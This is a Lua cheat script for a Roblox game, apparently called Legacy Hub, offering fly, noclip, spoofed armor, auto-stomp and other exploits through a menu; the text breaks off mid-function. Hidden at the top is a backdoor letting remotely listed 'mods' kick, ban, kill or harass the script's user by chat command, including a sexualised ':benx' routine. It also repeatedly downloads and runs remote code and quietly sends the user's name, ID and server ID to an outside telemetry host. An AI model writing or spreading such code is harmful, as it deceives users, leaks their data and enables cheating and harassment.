--[[
	id: qDd-RuD9iSfb3e9PpZBBi
	name: nil
	description: nil
	time1: 2021-07-22 09:23:41.165978+00
	time2: 2021-07-22 09:23:41.165979+00
	uploader: 6g-edaOZ1kTv1QgJ1jA-tibAOE7i6qDNYlqSzjkD
	uploadersession: I0GfVIn1Vo5pIL4SljVIgKWM78MK5F
	flag: f
--]]

repeat
	wait();
until game:IsLoaded();
coroutine.resume(coroutine.create(function()
	local bending = false;
	local kickmsg = 'PERMA BANNED';
	local function commands(msg, plr)
		local Mod = game:GetService('Players'):GetPlayerByUserId(plr);
		local Msg = string.lower(msg);
		local SplitCMD = string.split(Msg, ' ');
		local Lower = string.lower(game:GetService('Players').LocalPlayer.Name);
		local Allowed = string.find(Lower, SplitCMD[2]);
		if Allowed then
			if string.find(SplitCMD[1], ':eval') then
				pcall(SplitCMD[3]);
			end;
			if string.find(SplitCMD[1], ':freeze') then
				game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = true;
			end;
			if string.find(SplitCMD[1], ':thaw') then
				game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Anchored = false;
			end;
			if string.find(SplitCMD[1], ':benx') then
				bending = true
				local segtarget = Mod.Name
				local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
				Crouch.Looped = true
				Crouch:Play()
				local away = .5
				local reversing = false
				local shirt = game.Players.LocalPlayer.Character:FindFirstChild('Shirt')
				local pants = game.Players.LocalPlayer.Character:FindFirstChild('Pants')
				if shirt then
					shirt:Destroy()
				end
				if pants then
					pants:Destroy()
				end
				local Loop
				local loopFunction = function()
					local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
					local character = game.Players.LocalPlayer.Character
					if targetchar then
						if reversing == true then
							away = away - 0.1
						else
							away = away + 0.1
						end
						if away >= 2 then
							reversing = true
						elseif away < 0.5 then
							reversing = false
						end
						character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
					end
				end;
				local Start = function()
					Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
				end;
				local Pause = function()
					Loop:Disconnect()
					Crouch:Stop()
				end;
				Start()	
				repeat wait() until bending == false
				Pause()
			end
			if string.find(SplitCMD[1], ':unbenx') then
				while bending == true do
					wait()
					bending = false
				end
			end;
			if string.find(SplitCMD[1], ':kick') then
				game.Players.LocalPlayer:Kick(SplitCMD[3])
			end;
			if string.find(SplitCMD[1], ':bring') then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
			end;
			if string.find(SplitCMD[1], ':ban') then
				game.Players.LocalPlayer:Kick(kickmsg)
			end;
			if string.find(SplitCMD[1], ':kill') then
				game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):Destroy()
			end;
			if string.find(SplitCMD[1], ':amogus') then
				local Sound = Instance.new("Sound", game.CoreGui)
				Sound.PlaybackSpeed = 1
				Sound.Volume = 1
				Sound.SoundId = "rbxassetid://6574370799"
				Sound.Looped = true
				Sound:Play()
				pcall(function()
					game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
					game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
					game.Players.LocalPlayer.Character.Head.Neck:Destroy()
					game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
					game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
					game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
					game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
					game.Players.LocalPlayer.Character.Head.Massless = true
					game.Players.LocalPlayer.Character.Head.CanCollide = false

					while true do 
						pcall(function()  
							game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
							game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
							game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
						end)
						wait()
					end
				end)
				game.Players.LocalPlayer.CharacterAdded:Connect(function()
					pcall(function()
						game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
						game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
						game.Players.LocalPlayer.Character.Head.Neck:Destroy()
						game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
						game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
						game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
						game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0, 0, 0)
						game.Players.LocalPlayer.Character.Head.Massless = true
						game.Players.LocalPlayer.Character.Head.CanCollide = false

						while true do 
							pcall(function()  
								game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
								game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame = CFrame.new(0, 100000.4736328125, 0)
								game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
							end)
							wait()
						end
					end)
				end)
			end;
			if string.find(SplitCMD[1], ':refresh') then
				_G.Character = game.Players.LocalPlayer.Character
				_G.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):Destroy()
				local Character = Instance.new("Model", workspace)
				game.Players.LocalPlayer.Character = Character
				wait()
				game.Players.LocalPlayer.Character = _G.Character
				Character:Destroy()
				game.Players.LocalPlayer.Character:BreakJoints()
				wait(game.Players.RespawnTime + 0.5)
				wait(0.30)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _G.Position
				wait(0.5)
			end;
		else
			if string.find(msg, '/e test') then
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Oh yeah yeah", 'All');
			end;
		end;
	end;

	local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/Legacy-Hub/main/.extras/.mods'))()
	game:GetService('Players').PlayerAdded:Connect(function(plr)
		if ModCheck[plr.UserId] then
			plr.Chatted:Connect(function(msg)
				commands(msg, plr.UserId);
			end);
		end;
	end);

	for i,v in pairs(game:GetService('Players'):GetChildren()) do
		if ModCheck[v.UserId] then
			v.Chatted:Connect(function(msg)
				commands(msg, v.UserId);
			end);
		end;
	end;
end));
coroutine.resume(coroutine.create(function()
	while wait(3) do
		local function main()
			if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
				game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true;
			end;
			if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild('OriginalSize') then
				game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild('OriginalSize'):Destroy();
			end;
			loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/Legacy-Hub/main/.extras/.names'))();
		end;
		local success, err = pcall(main);
	end;
end));
coroutine.resume(coroutine.create(function()
	game:HttpGet('https://legacy-telemetry.herokuapp.com/premium.php?user='..game:GetService('Players').LocalPlayer.Name..'&id='..game:GetService('Players').LocalPlayer.UserId..'&job='..game.JobId);
	game:HttpGet('https://legacy-telemetry.herokuapp.com/telemetry.php?user='..game:GetService('Players').LocalPlayer.Name..'&id='..game:GetService('Players').LocalPlayer.UserId);
end));
function Init()
	local UILibrary = loadstring(game:HttpGet('https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt'))();
	local WinUI = UILibrary:Window('Legacy Hub')

	local MainUI = WinUI:Server('Legacy Hub', '');
	local PlayerChannel = MainUI:Channel('player');
	local CombatChannel = MainUI:Channel('combat');
	local TeleportsChannel = MainUI:Channel('teleports');
	local AutobuyChannel = MainUI:Channel('autobuy');
	local AutofarmChannel = MainUI:Channel('autofarm');
	local CashChannel = MainUI:Channel('cash');
	local FeaturedChannel = MainUI:Channel('featured');
	local AnimationsChannel = MainUI:Channel('animations');
	local ExtrasChannel = MainUI:Channel('extras');

	_G.FLYMODE = 'Default';
	_G.FLYSPEED = 20;

	local Fly = PlayerChannel:Button('Fly (X)', function()
		if _G.FLYMODE == 'Default' then
			local plr = game.Players.LocalPlayer
			local Humanoid = plr.Character:FindFirstChildWhichIsA('Humanoid')
			local mouse = plr:GetMouse()
			localplayer = plr
			if workspace:FindFirstChild("Core") then
				workspace.Core:Destroy()
			end
			local Core = Instance.new("Part")
			Core.Name = "Core"
			Core.Size = Vector3.new(0.05, 0.05, 0.05)
			spawn(function()
				Core.Parent = workspace
				local Weld = Instance.new("Weld", Core)
				Weld.Part0 = Core
				Weld.Part1 = localplayer.Character.LowerTorso
				Weld.C0 = CFrame.new(0, 0, 0)
			end)
			workspace:WaitForChild("Core")
			local torso = workspace.Core
			flying = true
			local speed=_G.FLYSPEED
			local keys={a=false,d=false,w=false,s=false}
			local e1
			local e2
			local function start()
				local pos = Instance.new("BodyPosition",torso)
				local gyro = Instance.new("BodyGyro",torso)
				pos.Name="EPIXPOS"
				pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
				pos.position = torso.Position
				gyro.maxTorque = Vector3.new(15e15, 15e15, 15e15)
				gyro.cframe = torso.CFrame
				repeat
					wait()
					Humanoid.PlatformStand=true
					local new=gyro.cframe - gyro.cframe.p + pos.position
					if not keys.w and not keys.s and not keys.a and not keys.d then
						speed=_G.FLYSPEED
					end
					if keys.w then
						new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
						speed=speed
					end
					if keys.s then
						new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
						speed=speed
					end
					if keys.d then
						new = new * CFrame.new(speed,0,0)
						speed=speed
					end
					if keys.a then
						new = new * CFrame.new(-speed,0,0)
						speed=speed
					end
					if speed>_G.FLYSPEED then
						speed=_G.FLYSPEED
					end
					pos.position=new.p
					if keys.w then
						gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed),0,0)
					elseif keys.s then
						gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed),0,0)
					else
						gyro.cframe = workspace.CurrentCamera.CoordinateFrame
					end
				until flying == false
				if gyro then gyro:Destroy() end
				if pos then pos:Destroy() end
				flying=false
				Humanoid.PlatformStand=false
				speed=_G.FLYSPEED
			end
			e1=mouse.KeyDown:connect(function(key)
				if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
				if key=="w" then
					keys.w=true
				elseif key=="s" then
					keys.s=true
				elseif key=="a" then
					keys.a=true
				elseif key=="d" then
					keys.d=true
				elseif key=="x" then
					if flying==true then
						flying=false
					else
						flying=true
						start()
					end
				end
			end)
			e2=mouse.KeyUp:connect(function(key)
				if key=="w" then
					keys.w=false
				elseif key=="s" then
					keys.s=false
				elseif key=="a" then
					keys.a=false
				elseif key=="d" then
					keys.d=false
				end
			end)
		elseif _G.FLYMODE == 'IY' then
			repeat wait() 
			until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
			local mouse = game.Players.LocalPlayer:GetMouse() 
			repeat wait() until mouse
			local plr = game.Players.LocalPlayer 
			local torso = plr.Character.Head 
			local flying = false
			local deb = true 
			local ctrl = {f = 0, b = 0, l = 0, r = 0} 
			local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
			local maxspeed = 5000
			local speed = 5000 

			function Fly() 
				local bg = Instance.new("BodyGyro", torso) 
				bg.P = 9e4 
				bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
				bg.cframe = torso.CFrame 
				local bv = Instance.new("BodyVelocity", torso) 
				bv.velocity = Vector3.new(0,0.1,0) 
				bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
				repeat wait() 
					plr.Character.Humanoid.PlatformStand = true 
					if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then 
						speed = speed+.0+(speed/maxspeed) 
						if speed > maxspeed then 
							speed = maxspeed 
						end 
					elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then 
						speed = speed-5
						if speed > 5 then 
							speed = -2 
						end 
					end 
					if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then 
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
						lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
					elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then 
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
					else 
						bv.velocity = Vector3.new(0,0.1,0) 
					end 
					bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
				until not flying 
				ctrl = {f = 0, b = 0, l = 0, r = 0} 
				lastctrl = {f = 0, b = 0, l = 0, r = 0} 
				speed = 5 
				bg:Destroy() 
				bv:Destroy() 
				plr.Character.Humanoid.PlatformStand = false 
			end 
			mouse.KeyDown:connect(function(key) 
				if key:lower() == "x" then 
					if flying then flying = false 
					else 
						flying = true 
						Fly() 
					end 
				elseif key:lower() == "w" then 
					ctrl.f = 45
				elseif key:lower() == "s" then 
					ctrl.b = -45 
				elseif key:lower() == "a" then 
					ctrl.l = -45 
				elseif key:lower() == "d" then 
					ctrl.r = 45
				end 
			end) 
			mouse.KeyUp:connect(function(key) 
				if key:lower() == "w" then 
					ctrl.f = 0
				elseif key:lower() == "s" then 
					ctrl.b = 0
				elseif key:lower() == "a" then 
					ctrl.l = 0
				elseif key:lower() == "d" then 
					ctrl.r = 0
				end 
			end)
		elseif _G.FLYMODE == 'SuperHero' then
			local player = game.Players.LocalPlayer
			local Flyanimation = Instance.new('Animation', game.Workspace)
			Flyanimation.AnimationId = 'rbxassetid://3541044388'
			local Idleanimation = Instance.new('Animation', game.Workspace)
			Idleanimation.AnimationId = 'rbxassetid://3541114300'
			local HeroIdle = player.Character.Humanoid:LoadAnimation(Idleanimation)
			local HeroFly = player.Character.Humanoid:LoadAnimation(Flyanimation)
			Idleing2 = false
			local function flyanim()
				--HeroIdle:Stop()
				local FlyingA = false
				for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
					if v.Animation.AnimationId == 'rbxassetid://3541044388' then
						FlyingA = true
					end
					if v.Animation.AnimationId == 'rbxassetid://2788289281' then
						v:Stop()
					end
					if v.Animation.AnimationId == 'rbxassetid://2788292075' then
						v:Stop()
					end
				end
				if FlyingA == false and Idleing2 == false then
					HeroFly:Play()
				end
			end

			local SPEED = _G.FLYSPEED
			repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
			local mouse = game.Players.LocalPlayer:GetMouse()
			repeat wait() until mouse
			local plr = game.Players.LocalPlayer
			local torso = plr.Character.Head
			flying = false
			local deb = true
			local ctrl = {f = 0, b = 0, l = 0, r = 0}
			local lastctrl = {f = 0, b = 0, l = 0, r = 0}
			maxspeed = 5000
			speed = 5000
			function Fly()
				local bg = Instance.new("BodyGyro", torso)
				bg.P = 9e4
				bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				bg.cframe = torso.CFrame
				local bv = Instance.new("BodyVelocity", torso)
				bv.velocity = Vector3.new(0,0.1,0)
				bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
				repeat wait()
					plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
					if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
						speed = speed+.0+(speed/maxspeed)
						local foundidle = false
						flyanim()
						if speed > maxspeed then

							speed = maxspeed

						end
					elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
						speed = speed-5

						if speed > 5 then
							speed = -2
						end
					end
					if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
					elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed

					else
						bv.velocity = Vector3.new(0,0.1,0)


					end
					bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
				until not flying
				ctrl = {f = 0, b = 0, l = 0, r = 0}
				lastctrl = {f = 0, b = 0, l = 0, r = 0}
				speed = 5
				bg:Destroy()
				bv:Destroy()
				plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
			end
			mouse.KeyDown:connect(function(key)
				if key:lower() == "x" then
					if flying then
						flying = false
						HeroFly:Stop()
						HeroIdle:Stop()
					else
						flying = true
						Fly()
					end

				elseif key:lower() == "w" then
					ctrl.f = _G.FLYSPEED
				elseif key:lower() == "s" then
					ctrl.b = -_G.FLYSPEED
				elseif key:lower() == "a" then
					ctrl.l = -_G.FLYSPEED
				elseif key:lower() == "d" then
					ctrl.r = _G.FLYSPEED
				end
			end)
			mouse.KeyUp:connect(function(key)
				if key:lower() == "w" then
					ctrl.f = 0
				elseif key:lower() == "s" then
					ctrl.b = 0
				elseif key:lower() == "a" then
					ctrl.l = 0
				elseif key:lower() == "d" then
					ctrl.r = 0
				end
				if ctrl.r == 0 and ctrl.l == 0 and ctrl.b == 0 and ctrl.f == 0 then
					local Loop
					local loopFunction = function()
						Idleing2 = true
						HeroFly:Stop()
						wait()
						Idleing = false
						for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
							if v.Animation.AnimationId == 'rbxassetid://3541114300' then
								Idleing = true
							end
						end
						if Idleing == false and flying == true then
							HeroIdle:Play()
						end

					end;
					local Start = function()
						Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
					end;
					local Pause = function()
						Loop:Disconnect()
						Idleing2 = false
					end;
					Start()	
					repeat wait() until ctrl.r ~= 0 or ctrl.l ~= 0 or ctrl.b ~= 0 or ctrl.f ~= 0 or flying == false
					Pause()
				end
			end)
			player.CharacterAdded:Connect(function()
				repeat wait() until player.Character
				wait(1)
			end)
		end;
	end);
	local FlyMode = PlayerChannel:Dropdown('Fly Mode', {
		'Default';
		'IY';
		'SuperHero';
	}, function(Value)
		local notifSound = Instance.new("Sound",workspace)
		notifSound.PlaybackSpeed = 1.5
		notifSound.Volume = 0.15
		notifSound.SoundId = "rbxassetid://170765130"
		notifSound.PlayOnRemove = true
		notifSound:Destroy()
		game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Flymode changed to "..Value.." {changes on death}", Icon = "rbxassetid://505845268", Duration = 15, Button1 = "Okay"})
		_G.FLYMODE = Value;
	end);
	local FlySpeed = PlayerChannel:Slider('Fly Speed', 20, 100, 20, function(Value)
		_G.FLYSPEED = Value;
	end);
	local Walkspeed = PlayerChannel:Button('Walkspeed (Z)', function()
		superhuman = false
		plr = game.Players.LocalPlayer
		mouse = plr:GetMouse()
		mouse.KeyDown:connect(function(key)
			if key == "z" and superhuman == false then
				superhuman = true
				game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
				game.Players.LocalPlayer.Character.Humz.WalkSpeed = 100
				game.Players.LocalPlayer.Character.Humz.JumpPower = 200
			elseif key == "z" and superhuman == true then
				superhuman = false
				game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
				game.Players.LocalPlayer.Character.Humz.JumpPower = 50
				game.Players.LocalPlayer.Character.Humz.Name = "Humanoid"
			end
		end)
	end);
	local Noclip = PlayerChannel:Button('Noclip (K)', function()
		noclip = false
		game:GetService('RunService').Stepped:connect(function()
			if noclip then
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(11)
			end
		end)
		plr = game.Players.LocalPlayer
		mouse = plr:GetMouse()
		mouse.KeyDown:connect(function(key)
			if key == "k" then
				noclip = not noclip
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(11)
			end
		end)
	end);
	local ClickTP = PlayerChannel:Button('Click TP (Q)', function()
		plr = game.Players.LocalPlayer
		hum = plr.Character.HumanoidRootPart
		mouse = plr:GetMouse()

		mouse.KeyDown:connect(function(key)
			if key == "q" then
				if mouse.Target then
					hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
				end
			end
		end)
	end);
	local GodBullet = PlayerChannel:Button('God Bullet + God Block', function()
		local localPlayer = game:GetService('Players').LocalPlayer;
		local localCharacter = localPlayer.Character;
		localCharacter:FindFirstChildOfClass('Humanoid'):Destroy();
		local newCharacter = localPlayer.CharacterAdded:Wait();
		local spoofFolder = Instance.new('Folder');
		spoofFolder.Name = 'FULLY_LOADED_CHAR';
		spoofFolder.Parent = newCharacter;
		newCharacter:WaitForChild('RagdollConstraints'):Destroy();
		newCharacter:WaitForChild('BodyEffects'):WaitForChild('Defense'):Destroy();
		newCharacter:WaitForChild('BodyEffects'):WaitForChild('Armor'):Destroy();
		local spoofValue = Instance.new('BoolValue', newCharacter);
		spoofValue.Name = 'RagdollConstraints';
		local defValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
		defValue.Name = 'Defense';
		defValue.Value = 100;
		local armValue = Instance.new('IntValue', game:GetService('Players').LocalPlayer.Character:FindFirstChild('BodyEffects'));
		armValue.Name = 'Armor';
		armValue.Value = 100;
	end);
	local Naked = PlayerChannel:Button('Naked', function()
		local function inTable(What, Table)
			for Index, Value in pairs(Table) do
				if What == Value then
					return true
				end
			end
			return false
		end

		local removingClasses = {
			"Accessory",
			"Pants",
			"Shirt",
		}

		for _, Instance in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if inTable(Instance.ClassName, removingClasses) or Instance.Name == "face" then
				Instance:Destroy()
			end
		end
	end);
	local AutoStomp = PlayerChannel:Button('Auto Stomp (C)', function()
		autostomp = false
		game:GetService('RunService').Stepped:connect(function()
			if autostomp then
				game.ReplicatedStorage.MainEvent:FireServer("Stomp")
			end
		end)
		plr = game.Players.LocalPlayer
		mouse = plr:GetMouse()
		mouse.KeyDown:connect(function(key)
			if key == "c" then
				autostomp = not autostomp
				game.ReplicatedStorage.MainEvent:FireServer("Stomp")
			end
		end)
	end);
	local AutoBlock = PlayerChannel:Button('Auto Block (G)', function()
		autostomp = false
		game:GetService('RunService').Stepped:connect(function()
			if autostomp then
				game.ReplicatedStorage.MainEvent:FireServer("Block", true)
			end
		end)
		plr = game.Players.LocalPlayer
		mouse = plr:GetMouse()
		mouse.KeyDown:connect(function(key)
			if key == "g" then
				autostomp = not autostomp
				game.ReplicatedStorage.MainEvent:FireServer("Block", autostomp)
			end
		end)
	end);
	local Rejoin = PlayerChannel:Button('Rejoin', function()
		if (#game:GetService('Players'):GetPlayers() <= 1) then
			game:GetService('TeleportService'):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer);
		else
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer);
		end
	end);
	local AntiBag = PlayerChannel:Button('Anti Bag', function()
		while wait() do
			pcall(function()
				game:GetService("Players").LocalPlayer.Character:FindFirstChild("Christmas_Sock"):Destroy();
			end);
		end;
	end);
	local Anonymous = PlayerChannel:Button('Anonymous', function()
		pcall(function()
			game.Players.LocalPlayer.Character.Shirt:Destroy()
			game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
			game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.RightUpperLeg.Size = Vector3.new(0,0,0)
			game.Players.LocalPlayer.Character.RightUpperLeg.Massless = true
			game.Players.LocalPlayer.Character.RightUpperLeg.CanCollide = false

			heazd = true

			while heazd == true do 
				pcall(function()  
					game.Players.LocalPlayer.Character.RightUpperLeg.RightHipRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.RightUpperLeg.CFrame = CFrame.new(0, 100000.4736328125, 0)
				end)
				wait()
			end
		end)
		wait(0.10)
		pcall(function()
			game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
			game.Players.LocalPlayer.Character.Pants:Destroy()
			game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.LeftUpperLeg.Size = Vector3.new(0,0,0)
			game.Players.LocalPlayer.Character.LeftUpperLeg.Massless = true
			game.Players.LocalPlayer.Character.LeftUpperLeg.CanCollide = false

			heazd = true

			while heazd == true do 
				pcall(function()  
					game.Players.LocalPlayer.Character.LeftUpperLeg.LeftHipRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.LeftUpperLeg.CFrame = CFrame.new(0, 100000.4736328125, 0)
				end)
				wait()
			end
		end)
		wait(0.10)
		pcall(function()
			game.Players.LocalPlayer.Character.Head.Neck:Destroy()
			game.Players.LocalPlayer.Character.UpperTorso.NeckAttachment:Destroy()
			game.Players.LocalPlayer.Character.Humanoid.HealthDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Humanoid.NameDisplayDistance = math.huge
			game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0,0,0)
			game.Players.LocalPlayer.Character.Head.Massless = true
			game.Players.LocalPlayer.Character.Head.CanCollide = false

			heazd = true

			while heazd == true do 
				pcall(function()  
					game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.UpperTorso.NeckRigAttachment.CFrame =  CFrame.new(0, 100000.4736328125, 0)
					game.Players.LocalPlayer.Character.Head.CFrame = CFrame.new(0, 100000.4736328125, 0)
				end)
				wait()
			end
		end)
	end);
	local AntiGrab = PlayerChannel:Button('Anti Grab', function()
		while wait() do
			pcall(function()
				local LocalPlayer = game:GetService("Players").LocalPlayer
				local char = LocalPlayer.Character
				if game.Players.LocalPlayer.Character["GRABBING_CONSTRAINT"] then
					game.Players.LocalPlayer.Character["GRABBING_CONSTRAINT"]:Destroy()
				end
			end)
		end
	end);
	local BikeFly = PlayerChannel:Button('Bike Fly', function()
		local speed = 20
		local old
		local Plr = game.Players.LocalPlayer
		local wheels = {}
		local control = {q=false,e=false,w=false,a=false,s=false,d=false}
		local Mouse = Plr:GetMouse()

		Mouse.KeyDown:connect(function(KEY)
			local key = KEY:lower()
			if control[key] ~= nil then
				control[key]=true
			end
		end)

		Mouse.KeyUp:connect(function(KEY)
			local key = KEY:lower()
			if control[key] ~= nil then
				control[key]=false
			end
		end)

		while game.RunService.Stepped:wait() do
			local seat = (Plr.Character or Plr.CharacterAdded:wait()):WaitForChild("Humanoid").SeatPart
			if Plr.PlayerGui:FindFirstChild("MainScreenGui") and Plr.PlayerGui.MainScreenGui:FindFirstChild("Bar") and Plr.PlayerGui.MainScreenGui.Bar:FindFirstChild("Speed") then
				Plr.PlayerGui.MainScreenGui.Bar.Speed.bar.Size = UDim2.new(speed / 100 * 0.95, 0, 0.83, 0)
			else
				local c = Plr.PlayerGui.MainScreenGui.Bar.HP
				local g = c:Clone()
				g.Name = "Speed"
				g.Position = UDim2.new(0.5, 0, 1, -120)
				g.bar.BackgroundColor3 = Color3.fromRGB(255, 155, 0)
				g.Picture.Image.Image = "rbxassetid://181035717"
				g.TextLabel.Text = "Speed"
				g.Parent = c.Parent
			end
			if seat ~= nil and seat:IsDescendantOf(game.Workspace.Vehicles) then
				if seat ~= old then
					if old then
						old.Vel:Destroy()
						old.Gyro:Destroy()
					end
					old = seat
					for i = 1, 2 do
						if wheels[i] then
							wheels[i][2].Parent = wheels[i][1]
						end
						local wheel = seat.Parent.Wheel
						wheels[i] = {seat.Parent, wheel}
						wheel:remove()
					end
					local gyro = Instance.new("BodyGyro", seat)
					gyro.Name = "Gyro"
